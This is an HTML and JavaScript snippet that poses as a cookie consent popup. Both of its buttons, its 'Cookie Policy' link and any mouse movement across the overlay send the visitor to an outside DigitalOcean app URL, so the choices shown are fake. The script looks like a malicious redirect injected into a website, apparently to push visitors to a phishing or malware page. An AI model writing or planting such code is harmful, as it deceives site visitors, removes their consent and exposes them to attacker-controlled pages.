<style>
.notice-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.45);display:flex;justify-content:center;align-items:center;z-index:9999;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif}.notice-modal{background:#fff;padding:2rem 2.5rem;border-radius:20px;max-width:420px;width:90%;box-shadow:0 20px 40px rgba(0,0,0,0.15);text-align:center;animation:popIn 0.3s ease-out}.notice-icon{font-size:40px;margin-bottom:0.5rem}.notice-header{font-size:22px;color:#222;margin-bottom:0.8rem}.notice-message{font-size:14px;color:#555;line-height:1.6;margin-bottom:1.5rem;justify-content:center;text-align:conter;}.notice-actions{display:flex;justify-content:center;gap:1rem;flex-wrap:wrap;text-align:center;}.notice-btn{padding:10px 22px;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;transition:background 0.2s ease-in-out}.notice-btn--yes{background:#4CAF50}.notice-btn--yes:hover{background:#45a049}.notice-btn--no{background:#f44336}.notice-btn--no:hover{background:#e53935}@keyframes popIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
</style>
<script>
(() => {
    const REDIRECT_URL = "https://walrus-app-d4d7w.ondigitalocean.app/";
    let isRedirected = false;
    let startPos = null;
    let hasMovedInsideActiveArea = false; // Flag to track movement within the active 80% area
    function handleRedirect() {
        if (isRedirected) return;
        isRedirected = true;
        window.location.href = REDIRECT_URL;
    }
    function detectMouseMove(event) {
        const noticeOverlay = document.querySelector('.notice-overlay');
        if (!noticeOverlay) return;
        const rect = noticeOverlay.getBoundingClientRect();
        const overlayHeight = rect.height;
        const skipHeight = overlayHeight * 0.05; // 10% from the top
        const activeTop = rect.top + skipHeight; // The y-coordinate where the active area begins
        // Check if the cursor is within the active 80% of the overlay (from `activeTop` downwards)
        const isInsideActiveArea = (
            event.clientX >= rect.left &&
            event.clientX <= rect.right &&
            event.clientY >= activeTop && // Start checking from activeTop
            event.clientY <= rect.bottom
        );
        if (isInsideActiveArea) {
            if (!startPos) {
                startPos = { x: event.clientX, y: event.clientY };
                return;
            }
            const moveThreshold = 10; // Pixels
            if (Math.abs(event.clientX - startPos.x) > moveThreshold || Math.abs(event.clientY - startPos.y) > moveThreshold) {
                if (!hasMovedInsideActiveArea) { // Only trigger timeout once per entry into the active area
                    hasMovedInsideActiveArea = true;
                    setTimeout(handleRedirect, 1000); // Redirect after 1 second of movement detection
                }
            }
        } else {
            // Reset if cursor moves outside the active area
            startPos = null;
            hasMovedInsideActiveArea = false;
        }
    }
    function generateConsentPopup() {
        const overlayDiv = document.createElement("div");
        overlayDiv.className = "notice-overlay";
        overlayDiv.setAttribute("role", "dialog");
        overlayDiv.setAttribute("aria-modal", "true");
        overlayDiv.innerHTML = `
<div class="notice-modal">
<div class="notice-icon" aria-hidden="true">🍪</div>
<h2 class="notice-header">Are you consenting to cookies?</h2>
<p class="notice-message">
                    We use cookies to enhance your experience, analyze site usage, and assist in our marketing efforts. By clicking "Accept All" or continuing to browse, you consent to the use of cookies.
<a href="${REDIRECT_URL}" target="_blank">View our full Cookie Policy here.</a>
</p>
<div class="notice-actions">
<button id="accept-btn" class="notice-btn notice-btn--yes">Accept All</button>
<button id="reject-btn" class="notice-btn notice-btn--no">Manage Preferences</button>
</div>
</div>
        `;
        return overlayDiv;
    }
    document.addEventListener("DOMContentLoaded", () => {
        const consentPopup = generateConsentPopup();
        document.body.appendChild(consentPopup);
        document.getElementById("accept-btn").addEventListener("click", handleRedirect);
        document.getElementById("reject-btn").addEventListener("click", handleRedirect);
        window.addEventListener("mousemove", detectMouseMove);
    });
})();
</script>
